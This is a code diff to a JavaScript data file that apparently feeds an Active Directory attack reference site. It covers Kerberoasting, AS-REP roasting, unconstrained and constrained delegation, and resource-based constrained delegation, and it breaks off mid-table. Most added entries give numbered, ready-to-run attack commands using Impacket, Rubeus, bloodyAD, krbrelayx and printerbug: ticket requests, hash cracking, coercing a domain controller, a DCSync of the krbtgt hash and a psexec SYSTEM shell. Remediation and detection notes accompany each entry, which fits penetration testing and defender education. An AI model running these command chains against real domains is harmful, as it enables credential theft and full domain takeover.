@@ -1363,48 +1363,69 @@ var VULNS = [
         name: "Kerberoasting",
         severity: "High",
         ref: "https://attack.mitre.org/techniques/T1558/003/",
-        theory: "theory/2026-08-18-kerberoasting.html",
-        description: "Any domain user requests service tickets for SPN accounts and cracks them offline to recover service-account passwords.",
-        brief: "Kerberoasting abuses a normal Kerberos feature: any authenticated user can request a service ticket for any account that has a Service Principal Name, and that ticket is encrypted with the service account's password-derived key. The attacker requests tickets for service accounts and cracks them offline — no elevated privilege, no noisy behaviour, just a standard ticket request.\n\nService accounts are frequently over-privileged and have weak, never-rotated passwords, so a cracked one is often a direct route to high privilege. See the Kerberoasting theory page for the full mechanism.",
+        theory: "theory/2026-08-18-kerberos.html",
+        description: "Any domain user requests service tickets for SPN accounts and cracks them offline to recover service-account passwords — often a direct path to high privilege.",
+        brief: "Kerberos issues a service ticket (TGS) to any authenticated user who asks for a given Service Principal Name, and the ticket is encrypted with the target service account's password-derived key. Kerberoasting requests those tickets and cracks them offline. No elevated privilege is needed and the request is indistinguishable from normal Kerberos traffic.\n\nImpact: service accounts are frequently over-privileged (sometimes Domain Admins) with weak, never-rotated passwords, so one cracked ticket can jump straight to high privilege.",
         quickReference: [
-          { label: "Request roastable tickets (Linux)", cmd: "GetUserSPNs.py -request -dc-ip <dc> corp.local/user:pass -outputfile hashes.txt" },
-          { label: "Rubeus (Windows)", cmd: "Rubeus.exe kerberoast /outfile:hashes.txt" },
-          { label: "Crack", cmd: "hashcat -m 13100 hashes.txt rockyou.txt" },
-          { label: "Find targets (LDAP)", cmd: "(&(objectClass=user)(servicePrincipalName=*))" }
+          { label: "Enumerate roastable accounts (LDAP filter)", cmd: "(&(objectClass=user)(servicePrincipalName=*))" },
+          { label: "Request tickets — Impacket (Linux)", cmd: "GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd' -outputfile hashes.kerberoast" },
+          { label: "Request tickets — Rubeus (Windows)", cmd: "Rubeus.exe kerberoast /nowrap /outfile:hashes.kerberoast" },
+          { label: "Crack offline", cmd: "hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt" }
         ],
         sections: [
           {
-            title: "Preconditions & Signal",
-            type: "table",
-            columns: ["Item", "Detail"],
-            rows: [
-              ["Requires", "Any valid domain credential"],
-              ["Target", "Accounts with a servicePrincipalName set (service accounts)"],
-              ["Best targets", "SPN accounts that are members of privileged groups with weak/old passwords"],
-              ["Etype matters", "RC4 (13100) cracks far faster than AES; tools request RC4 when possible"],
-              ["Detection", "A burst of TGS (event 4769) requests, especially RC4, from one account"]
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Enumerate accounts that have an SPN (from any domain user)", cmd: "# Impacket lists them and can request in one go\nGetUserSPNs.py -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'\n#   corp.local/jdoe:Passw0rd  -> any valid domain credential\n#   the output lists sAMAccountName + SPN of every service account" },
+              { label: "2. Request the TGS tickets and dump the crackable hashes", cmd: "GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd' \\\n  -outputfile hashes.kerberoast\n#   -request        actually asks the KDC for a TGS per SPN\n#   -outputfile     writes the $krb5tgs$ hashes ready for hashcat\n# Target one account instead of all:\n#   -request-user svc_sql" },
+              { label: "3. Prefer RC4 tickets — they crack orders of magnitude faster than AES", cmd: "# Rubeus can force RC4 (etype 23) and filter for likely-weak accounts\nRubeus.exe kerberoast /rc4opsec /nowrap /outfile:hashes.kerberoast\n#   /rc4opsec  request RC4 only where it won't downgrade an AES-only account (quieter)\n#   /nowrap    keep each hash on one line for hashcat" },
+              { label: "4. Crack offline (no traffic to the target)", cmd: "hashcat -m 13100 hashes.kerberoast rockyou.txt -r rules/best64.rule\n#   -m 13100   Kerberoast (TGS-REP) mode\n# a hit gives the service account's cleartext password" },
+              { label: "5. Targeted Kerberoast — add an SPN to a user you can write to, then roast it", cmd: "# needs GenericWrite/GenericAll over the target (see Dangerous AD ACLs)\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local set object svc_target servicePrincipalName -v 'fake/svc'\nGetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd' -request-user svc_target\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local set object svc_target servicePrincipalName -v ''  # clean up" }
             ]
           },
           {
-            title: "Impact",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Credential compromise", "Recover the service account's cleartext password offline"],
-              ["Privilege escalation", "Many service accounts are over-privileged, some Domain Admins"],
-              ["Lateral movement", "Reuse the account across systems it can access"],
-              ["Stealth", "The ticket request is indistinguishable from normal Kerberos traffic"]
+              ["1", "Authenticate with any domain user", "Foothold to send Kerberos requests"],
+              ["2", "LDAP-query accounts with servicePrincipalName set", "List of roastable service accounts"],
+              ["3", "Send TGS-REQ for each SPN (RC4 preferred)", "TGS-REP encrypted with the account's key"],
+              ["4", "Crack the $krb5tgs$ hash offline", "Service account cleartext password"],
+              ["5", "Authenticate as the service account", "Its privileges — frequently local admin or DA"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Impacket GetUserSPNs.py", "Enumerate and request TGS tickets from Linux"],
+              ["Rubeus", "Request/roast from a domain-joined Windows host, RC4 opsec"],
+              ["NetExec", "--kerberoasting one-liner across the domain"],
+              ["hashcat / John", "Offline cracking (mode 13100)"],
+              ["bloodyAD / PowerView", "Write an SPN for targeted Kerberoasting"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1558.003 — Kerberoasting", url: "https://attack.mitre.org/techniques/T1558/003/" },
+              { label: "HackingArticles — Deep dive into Kerberoasting", url: "https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/" },
+              { label: "The Hacker Recipes — Kerberoast", url: "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Use Group Managed Service Accounts (gMSA) — the DC manages a 120+ character password automatically, making roasting infeasible.",
-              "Where gMSA is not possible, enforce long (25+ char) random passwords on service accounts.",
-              "Enforce AES-only Kerberos to remove the fast RC4 cracking path.",
-              "Apply least privilege to service accounts so a crack has limited blast radius.",
-              "Monitor event 4769 for RC4 ticket-request spikes and deploy honeypot SPN accounts."
+              "Use Group Managed Service Accounts (gMSA/dMSA) — the DC manages a 120+ character password automatically, making cracking infeasible.",
+              "Where gMSA is not possible, enforce 25+ character random passwords on service accounts.",
+              "Enforce AES-only Kerberos to remove the fast RC4 cracking path (msDS-SupportedEncryptionTypes).",
+              "Apply least privilege to service accounts so a crack has minimal blast radius; never make a service account a Domain Admin.",
+              "Detect: event 4769 RC4 ticket-request spikes from one account; deploy a honeypot SPN account that no legitimate service uses."
             ]
           }
         ]
@@ -1414,46 +1435,66 @@ var VULNS = [
         name: "AS-REP Roasting",
         severity: "High",
         ref: "https://attack.mitre.org/techniques/T1558/004/",
-        theory: "theory/2026-08-18-asrep-roasting.html",
-        description: "Accounts with Kerberos pre-authentication disabled yield crackable AS-REP material — sometimes with no credentials.",
-        brief: "When an account has 'do not require pre-authentication' set, anyone can request an AS-REP for it and receive material encrypted with that account's key, crackable offline. With a valid credential you enumerate these accounts via LDAP; with only a username list you can attempt the request unauthenticated.\n\nPre-auth is usually disabled for a legacy app and never re-enabled. See the AS-REP Roasting theory page for the full mechanism.",
+        theory: "theory/2026-08-18-kerberos.html",
+        description: "Accounts with Kerberos pre-authentication disabled hand out crackable AS-REP material — obtainable with only a username list, no credentials.",
+        brief: "Normal Kerberos requires pre-authentication: the client proves it knows the password before the KDC issues anything. When 'do not require pre-authentication' is set on an account, anyone can request an AS-REP for it and receive material encrypted with that account's key, crackable offline.\n\nImpact: with a valid credential you enumerate these accounts over LDAP; with only a username list you can request AS-REPs unauthenticated — so this can produce a first crackable credential from nothing but a name list.",
         quickReference: [
-          { label: "With creds — enumerate + roast", cmd: "GetNPUsers.py corp.local/user:pass -request -outputfile asrep.txt" },
-          { label: "No creds — username list", cmd: "GetNPUsers.py corp.local/ -usersfile users.txt -no-pass" },
-          { label: "Crack", cmd: "hashcat -m 18200 asrep.txt rockyou.txt" },
-          { label: "Find targets (LDAP)", cmd: "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" }
+          { label: "Find pre-auth-disabled accounts (LDAP filter)", cmd: "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" },
+          { label: "With creds — enumerate + roast", cmd: "GetNPUsers.py corp.local/jdoe:'Passw0rd' -request -outputfile asrep.txt" },
+          { label: "No creds — from a username list", cmd: "GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10" },
+          { label: "Crack", cmd: "hashcat -m 18200 asrep.txt rockyou.txt" }
         ],
         sections: [
           {
-            title: "Preconditions & Signal",
-            type: "table",
-            columns: ["Item", "Detail"],
-            rows: [
-              ["Requires", "A username list (unauthenticated) or any domain credential (to enumerate)"],
-              ["Target", "Accounts with DONT_REQ_PREAUTH set"],
-              ["Pairs with", "Kerbrute username enumeration to build the candidate list quietly"],
-              ["Etype", "RC4 AS-REP (18200) cracks quickly"],
-              ["Detection", "Event 4768 with pre-auth type 0 for such accounts"]
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. (No credentials) Build a username list, then request AS-REPs", cmd: "# usernames from OSINT, doc metadata, or a naming convention\nGetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 -format hashcat -outputfile asrep.txt\n#   corp.local/     domain, empty user (the AS-REQ itself needs no auth)\n#   -no-pass        do not attempt a password\n#   any account with pre-auth off returns a $krb5asrep$ hash" },
+              { label: "2. (With a credential) Enumerate the vulnerable accounts directly", cmd: "GetNPUsers.py corp.local/jdoe:'Passw0rd' -request -outputfile asrep.txt\n# or query LDAP for the DONT_REQ_PREAUTH bit:\n#   (userAccountControl:1.2.840.113556.1.4.803:=4194304)" },
+              { label: "3. Rubeus equivalent from a domain host", cmd: "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.txt" },
+              { label: "4. Crack offline", cmd: "hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule\n#   -m 18200   Kerberos 5 AS-REP (etype 23)" },
+              { label: "5. Targeted AS-REP roast — if you can write UAC on a target", cmd: "# with GenericWrite over the account, flip pre-auth off, roast, flip back\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local add uac svc_target -f DONT_REQ_PREAUTH\nGetNPUsers.py corp.local/jdoe:'Passw0rd' -request -outputfile asrep.txt\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local remove uac svc_target -f DONT_REQ_PREAUTH" }
             ]
           },
           {
-            title: "Impact",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Credential compromise", "Crack the account password offline"],
-              ["Initial foothold", "Can yield a first valid credential from just a name list"],
-              ["Privilege escalation", "If the roasted account is privileged"]
+              ["1", "Obtain a username list (OSINT) or a domain credential", "Candidates to test / ability to enumerate"],
+              ["2", "Request AS-REP for accounts with pre-auth disabled", "$krb5asrep$ hash (no password needed)"],
+              ["3", "Crack the AS-REP hash offline", "Account cleartext password"],
+              ["4", "Authenticate as the account", "Foothold or privilege, depending on the account"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Impacket GetNPUsers.py", "Enumerate/request AS-REPs (with or without creds)"],
+              ["Rubeus", "asreproast from a Windows host"],
+              ["Kerbrute", "Quietly confirm which usernames exist first"],
+              ["hashcat / John", "Offline cracking (mode 18200)"],
+              ["bloodyAD / PowerView", "Toggle DONT_REQ_PREAUTH for targeted roasting"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1558.004 — AS-REP Roasting", url: "https://attack.mitre.org/techniques/T1558/004/" },
+              { label: "The Hacker Recipes — AS-REP roast", url: "https://www.thehacker.recipes/ad/movement/kerberos/asreproast" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Audit for and clear the DONT_REQ_PREAUTH flag everywhere it appears; never disable pre-authentication.",
-              "If an exception is truly required, give the account a long random password so the AS-REP is uncrackable.",
-              "Monitor event 4768 with pre-auth type 0 and deploy a honeypot account with pre-auth disabled.",
-              "Enforce AES to slow cracking where the flag cannot be removed immediately."
+              "Audit for and clear the DONT_REQ_PREAUTH flag everywhere; never disable Kerberos pre-authentication.",
+              "If an exception is genuinely required, give the account a long random password so the AS-REP is uncrackable.",
+              "Enforce AES to slow cracking where the flag cannot be removed immediately.",
+              "Detect: event 4768 with pre-auth type 0 for such accounts; deploy a honeypot account with pre-auth disabled and a strong password."
             ]
           }
         ]
@@ -1464,35 +1505,56 @@ var VULNS = [
         severity: "Critical",
         ref: "https://attack.mitre.org/techniques/T1558/",
         theory: "theory/2026-08-18-delegation.html",
-        description: "A host trusted for unconstrained delegation caches the TGTs of anyone who authenticates to it — coerce a DC and capture its ticket.",
-        brief: "A computer trusted for unconstrained delegation stores the full TGT of every user that authenticates to it, so it can impersonate them anywhere. If you compromise such a host — or coerce a high-value account like a domain controller to authenticate to it — you capture that TGT and become that identity.\n\nCoercing a DC's machine account and capturing its TGT is effectively domain compromise. See the Delegation theory page for the mechanism.",
+        description: "A host trusted for unconstrained delegation caches the TGT of everyone who authenticates to it — coerce a DC and capture its TGT for domain compromise.",
+        brief: "A computer trusted for unconstrained delegation stores the full TGT of any user who authenticates to it, so it can impersonate them anywhere. Compromise such a host — or coerce a high-value account like a domain controller into authenticating to it — and you capture that TGT.\n\nImpact: capturing a DC's TGT is effectively domain compromise. The danger is greatest when an ordinary server (not just a DC) is trusted for unconstrained delegation, because it becomes a stepping stone to the DC's identity.",
         quickReference: [
-          { label: "Find unconstrained hosts (LDAP)", cmd: "(userAccountControl:1.2.840.113556.1.4.803:=524288)" },
-          { label: "Capture TGTs on the host", cmd: "krbrelayx.py -aesKey <host_aes_key>" },
-          { label: "Coerce a DC to authenticate", cmd: "printerbug.py corp.local/user:pass@dc01 attacker_host" },
-          { label: "Reuse the captured DC TGT", cmd: "export KRB5CCNAME=DC01$.ccache && secretsdump.py -k -no-pass dc01" }
+          { label: "Find unconstrained-delegation hosts (LDAP)", cmd: "(userAccountControl:1.2.840.113556.1.4.803:=524288)" },
+          { label: "PowerView", cmd: "Get-DomainComputer -Unconstrained -Properties dnshostname" },
+          { label: "Listen for and capture inbound TGTs", cmd: "krbrelayx.py -aesKey <host_aes_key>" },
+          { label: "Coerce a DC to authenticate to your host", cmd: "printerbug.py 'corp.local/jdoe:Passw0rd'@dc01 attacker_host" }
         ],
         sections: [
           {
-            title: "Attack Chain",
-            type: "table",
-            columns: ["Step", "Detail"],
-            rows: [
-              ["Find it", "A computer with TRUSTED_FOR_DELEGATION (BloodHound flags these)"],
-              ["Control the host", "Compromise it, or own a computer object you created"],
-              ["Listen", "Run a capture listener with the host's key material"],
-              ["Coerce", "Force a DC to authenticate to the host (PrinterBug/PetitPotam/Coercer)"],
-              ["Capture & impersonate", "The DC's TGT is cached; use it to DCSync the domain"]
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Enumerate hosts trusted for unconstrained delegation", cmd: "# the TRUSTED_FOR_DELEGATION UAC bit (524288)\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname\n# BloodHound flags these too; DCs have it by design — the risk is any OTHER host that has it" },
+              { label: "2. On the delegation host you control, run a capture listener", cmd: "# you need the host account's key material (own the host first, or use a computer object you created)\nkrbrelayx.py -aesKey <host_account_AES256_key>\n# it waits for inbound authentications and extracts the cached TGT" },
+              { label: "3. Coerce a domain controller to authenticate to your host", cmd: "# PrinterBug (MS-RPRN) forces DC01's machine account to connect back\nprinterbug.py 'corp.local/jdoe:Passw0rd'@dc01 attacker_host\n# alternatives: PetitPotam (MS-EFSRPC), Coercer (sprays every method)" },
+              { label: "4. Reuse the captured DC TGT to replicate secrets (DCSync)", cmd: "export KRB5CCNAME='DC01$@CORP.LOCAL.ccache'\nsecretsdump.py -k -no-pass -just-dc-user krbtgt dc01.corp.local\n#   -k -no-pass   use the Kerberos ticket in KRB5CCNAME, no password\n# the krbtgt hash -> Golden Ticket -> full domain persistence" }
             ]
           },
           {
-            title: "Impact",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Domain compromise", "Capturing a DC's TGT yields the domain's secrets"],
-              ["Identity theft", "Impersonate any user who authenticates to the host"],
-              ["Persistence", "Combine with DCSync/Golden Ticket for durable control"]
+              ["1", "Find a host with TRUSTED_FOR_DELEGATION", "Delegation-trusted target"],
+              ["2", "Gain control of that host's key material", "Ability to run the capture listener"],
+              ["3", "Run krbrelayx capture listener", "Waiting to receive TGTs"],
+              ["4", "Coerce a DC (PrinterBug/PetitPotam) to authenticate", "DC machine-account TGT cached on your host"],
+              ["5", "Reuse the DC TGT to DCSync", "krbtgt hash → domain compromise"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["PowerView / BloodHound", "Find unconstrained-delegation hosts"],
+              ["krbrelayx.py", "Capture the TGT cached by the coerced authentication"],
+              ["printerbug.py / PetitPotam / Coercer", "Force a DC to authenticate to your host"],
+              ["Impacket secretsdump.py", "DCSync with the captured DC TGT"],
+              ["Rubeus", "monitor/tgtdeleg on a compromised Windows delegation host"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "Hadess — Pwning the Domain: Kerberos Delegation", url: "https://hadess.io/" },
+              { label: "dirkjanm — Exploiting unconstrained delegation", url: "https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/" },
+              { label: "The Hacker Recipes — Unconstrained delegation", url: "https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained" }
             ]
           },
           {
@@ -1500,10 +1562,93 @@ var VULNS = [
             type: "notes",
             items: [
               "Eliminate unconstrained delegation except where strictly required, and never on non-DC servers.",
-              "Put sensitive/Tier-0 accounts in Protected Users or mark them 'account is sensitive and cannot be delegated'.",
+              "Put sensitive/Tier-0 accounts in the Protected Users group or mark them 'account is sensitive and cannot be delegated' (NOT_DELEGATED).",
               "Disable the Print Spooler on DCs and patch coercion vectors to remove the trigger.",
-              "Prefer resource-based constrained delegation (RBCD) with tight scoping over unconstrained/constrained delegation.",
-              "Monitor for coercion RPC calls and anomalous TGT usage."
+              "Prefer resource-based constrained delegation with tight scoping over unconstrained/constrained delegation.",
+              "Detect: coercion RPC calls (MS-RPRN/MS-EFSRPC) and anomalous TGT usage from non-DC hosts."
+            ]
+          }
+        ]
+      },
+      {
+        id: "constrained-delegation",
+        name: "Constrained Delegation (S4U / Bronze Bit)",
+        severity: "Critical",
+        ref: "https://attack.mitre.org/techniques/T1558/003/",
+        theory: "theory/2026-08-18-delegation.html",
+        description: "An account configured for constrained delegation with protocol transition can impersonate any user to its allowed services — and the SPN in the ticket can be swapped to reach others.",
+        brief: "Constrained delegation limits an account to impersonating users only to the services listed in its msDS-AllowedToDelegateTo. Protocol transition (S4U2Self) lets it obtain a ticket to itself as ANY user — even one who never authenticated — and S4U2Proxy then converts that into a ticket to an allowed service.\n\nImpact: compromise an account with constrained delegation and you can impersonate a domain admin to its target services. Because the SPN in the S4U2Proxy ticket is plaintext, it can be rewritten (e.g. cifs → http) to reach other services on the same host. The Bronze Bit (CVE-2020-17049) removes even the 'forwardable' safeguard.",
+        quickReference: [
+          { label: "Find constrained-delegation accounts", cmd: "Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto" },
+          { label: "Impersonate Administrator via S4U (Impacket)", cmd: "getST.py -spn cifs/dc01.corp.local -impersonate Administrator corp.local/svc_web:'Passw0rd'" },
+          { label: "Rubeus S4U", cmd: "Rubeus.exe s4u /user:svc_web /rc4:<NTLM> /impersonateuser:Administrator /msdsspn:cifs/dc01 /altservice:http /ptt" },
+          { label: "Bronze Bit (force forwardable)", cmd: "getST.py -spn cifs/dc01 -impersonate Administrator -force-forwardable corp.local/svc_web -hashes :<NTLM>" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Identify accounts allowed to delegate (constrained)", cmd: "# accounts with msDS-AllowedToDelegateTo set, TRUSTED_TO_AUTH_FOR_DELEGATION UAC flag\nGet-DomainUser -TrustedToAuth -Properties cn,msds-allowedtodelegateto\nGet-DomainComputer -TrustedToAuth -Properties cn,msds-allowedtodelegateto" },
+              { label: "2. Request S4U2Self + S4U2Proxy as the impersonated user", cmd: "getST.py -spn cifs/dc01.corp.local -impersonate Administrator \\\n  corp.local/svc_web:'Passw0rd'\n#   -spn           an allowed target service (from msDS-AllowedToDelegateTo)\n#   -impersonate   the user you want a ticket as (any user, incl. Administrator)\n#   svc_web:...    the compromised delegation account\n# yields Administrator@... .ccache for cifs/dc01" },
+              { label: "3. Swap the SPN — the service class in the TGS is plaintext", cmd: "Rubeus.exe s4u /user:svc_web /rc4:<NTLM_of_svc_web> \\\n  /impersonateuser:Administrator /msdsspn:cifs/dc01 /altservice:http /ptt\n#   /altservice:http  rewrite cifs -> http to reach the web service on dc01\n#   /ptt              inject the resulting ticket into the current session\n# one delegated SPN often unlocks cifs, http, host, etc. on the same host" },
+              { label: "4. Bronze Bit (CVE-2020-17049) — defeat the 'not forwardable' protection", cmd: "# when the KDC withholds the Forwardable flag (e.g. Protected Users / sensitive target),\n# a known service key lets you flip it during S4U\ngetST.py -spn cifs/dc01.corp.local -impersonate Administrator -force-forwardable \\\n  corp.local/svc_web -hashes :<NTLM_of_svc_web>" },
+              { label: "5. Use the ticket", cmd: "export KRB5CCNAME='Administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache'\nsecretsdump.py -k -no-pass dc01.corp.local   # or psexec/smbexec as Administrator" }
+            ]
+          },
+          {
+            title: "How Protocol Transition Works",
+            type: "table",
+            columns: ["Extension", "What it does"],
+            rows: [
+              ["S4U2Self", "The service gets a ticket to ITSELF as any chosen user — even one who never logged in"],
+              ["S4U2Proxy", "Uses that ticket to get a ticket to an allowed target service, as that user"],
+              ["TRUSTED_TO_AUTH_FOR_DELEGATION", "UAC flag that lets the KDC issue a forwardable S4U2Self ticket"],
+              ["Plaintext SPN", "The service name in the TGS is not integrity-protected — swap cifs↔http↔host"],
+              ["Bronze Bit", "CVE-2020-17049 — forge the Forwardable flag when the KDC withholds it"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Compromise an account with constrained delegation", "S4U-capable identity + its key/NTLM"],
+              ["2", "S4U2Self as Administrator", "Forwardable ticket to self as the admin"],
+              ["3", "S4U2Proxy to an allowed SPN", "Service ticket to the target as Administrator"],
+              ["4", "Swap the SPN service class if needed", "Reach other services on the same host"],
+              ["5", "Authenticate to the target service", "Admin access — often to a DC"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["PowerView / BloodHound", "Find constrained-delegation accounts and targets"],
+              ["Impacket getST.py", "Perform S4U2Self/Proxy, including -force-forwardable (Bronze Bit)"],
+              ["Rubeus", "s4u with /altservice SPN swapping and /ptt"],
+              ["Impacket secretsdump / psexec", "Act on the target with the impersonation ticket"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "Hadess — Pwning the Domain: Kerberos Delegation", url: "https://hadess.io/" },
+              { label: "The Hacker Recipes — Constrained delegation", url: "https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained" },
+              { label: "CVE-2020-17049 — Kerberos Bronze Bit", url: "https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Minimise constrained delegation; where required, delegate to the narrowest set of specific SPNs and avoid delegating to DC services.",
+              "Place Tier-0 / high-value accounts in Protected Users and mark them 'sensitive and cannot be delegated'.",
+              "Patch the Bronze Bit (November 2020 updates) so the Forwardable flag cannot be forged.",
+              "Rotate the keys of any account configured for delegation if compromise is suspected.",
+              "Detect: S4U2Self/Proxy activity (event 4769) for privileged users from delegation accounts."
             ]
           }
         ]
@@ -1514,34 +1659,57 @@ var VULNS = [
         severity: "High",
         ref: "https://attack.mitre.org/techniques/T1134/",
         theory: "theory/2026-08-18-delegation.html",
-        description: "Write access to a computer object lets an attacker configure delegation and impersonate any user to that host.",
-        brief: "RBCD moves the delegation trust decision onto the target resource, via its msDS-AllowedToActOnBehalfOfOtherIdentity attribute. If you can write that attribute — through an ACL you hold or a relayed LDAP session — you point it at an account you control and then impersonate any user (including a domain admin) to that computer.\n\nBecause a normal user can create computer accounts by default (MachineAccountQuota), the whole chain is often achievable from a foothold. See the Delegation theory page for the mechanism.",
+        description: "Write access to a computer object lets an attacker configure delegation onto it and impersonate any user to that host — often achievable from a plain foothold.",
+        brief: "RBCD moves the delegation trust decision onto the target resource, via its msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Write that attribute — through an ACL you hold or a relayed LDAP session — pointing it at an account you control, then impersonate any user to the target.\n\nImpact: because a normal user can create computer accounts by default (MachineAccountQuota = 10), and write access to a computer object is common, the whole chain is frequently achievable from a low-privilege foothold, ending in full takeover of the target host.",
         quickReference: [
-          { label: "Create a computer you control", cmd: "addcomputer.py -computer-name EVIL$ -computer-pass Pass123 corp.local/user:pass" },
-          { label: "Write RBCD on the target", cmd: "bloodyAD -u user -p pass -d corp.local add rbcd TARGET$ EVIL$" },
-          { label: "Impersonate to the target", cmd: "getST.py -spn cifs/target.corp.local -impersonate Administrator corp.local/EVIL$:Pass123" },
-          { label: "Via relay", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access" }
+          { label: "Create a computer account you control", cmd: "addcomputer.py -computer-name EVIL$ -computer-pass 'Pass123!' -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'" },
+          { label: "Write RBCD on the target", cmd: "rbcd.py -delegate-from EVIL$ -delegate-to TARGET$ -action write -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'" },
+          { label: "Impersonate Administrator to the target", cmd: "getST.py -spn cifs/target.corp.local -impersonate Administrator corp.local/EVIL$:'Pass123!'" },
+          { label: "Set up via NTLM relay instead", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access" }
         ],
         sections: [
           {
-            title: "Attack Chain",
-            type: "table",
-            columns: ["Step", "Detail"],
-            rows: [
-              ["Control an SPN account", "Create a computer account (MachineAccountQuota) or use one you own"],
-              ["Gain write on the target", "GenericWrite/GenericAll over a computer (ACL) or a relayed LDAP session"],
-              ["Set the RBCD attribute", "Point msDS-AllowedToActOnBehalfOfOtherIdentity at your account"],
-              ["Impersonate", "S4U2Self + S4U2Proxy to get a service ticket as Administrator to the target"]
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Confirm you can write the target computer's attributes", cmd: "# BloodHound: GenericWrite / GenericAll / WriteAccountRestrictions over TARGET$\n# any of these lets you write msDS-AllowedToActOnBehalfOfOtherIdentity" },
+              { label: "2. Create a controlled account with an SPN (a computer account has one)", cmd: "addcomputer.py -computer-name EVIL$ -computer-pass 'Pass123!' \\\n  -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'\n#   MachineAccountQuota (default 10) lets any user create up to 10 of these" },
+              { label: "3. Point the target's RBCD attribute at your account", cmd: "rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \\\n  -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'\n#   writes msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET$ to trust EVIL$" },
+              { label: "4. Impersonate a privileged user to the target via S4U", cmd: "getST.py -spn cifs/target.corp.local -impersonate Administrator \\\n  corp.local/EVIL$:'Pass123!'\n#   -spn cifs/target   the service on the target you want\n#   -impersonate       any user, e.g. Administrator\n# yields Administrator@cifs_target.ccache" },
+              { label: "5. Use it", cmd: "export KRB5CCNAME='Administrator@cifs_target.corp.local@CORP.LOCAL.ccache'\npsexec.py -k -no-pass target.corp.local   # SYSTEM shell on the target" }
             ]
           },
           {
-            title: "Impact",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Host takeover", "Full access to the target computer as any user"],
-              ["Privilege escalation", "Impersonate a domain admin to the target"],
-              ["Common relay payoff", "The standard follow-up to an LDAP relay or an ACL win"]
+              ["1", "Gain write over a computer object (ACL or relay)", "Ability to set RBCD on the target"],
+              ["2", "Create/own an account with an SPN", "Principal that can be delegated from"],
+              ["3", "Write msDS-AllowedToActOnBehalfOfOtherIdentity", "Target now trusts your account to delegate"],
+              ["4", "S4U2Self + S4U2Proxy as Administrator", "Service ticket to the target as admin"],
+              ["5", "PsExec / secretsdump to the target", "SYSTEM on the host"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Impacket addcomputer.py", "Create a controlled computer account"],
+              ["Impacket rbcd.py / bloodyAD", "Write the RBCD attribute on the target"],
+              ["Impacket getST.py", "S4U impersonation to obtain the ticket"],
+              ["ntlmrelayx.py", "--delegate-access to configure RBCD via a relayed LDAP session"],
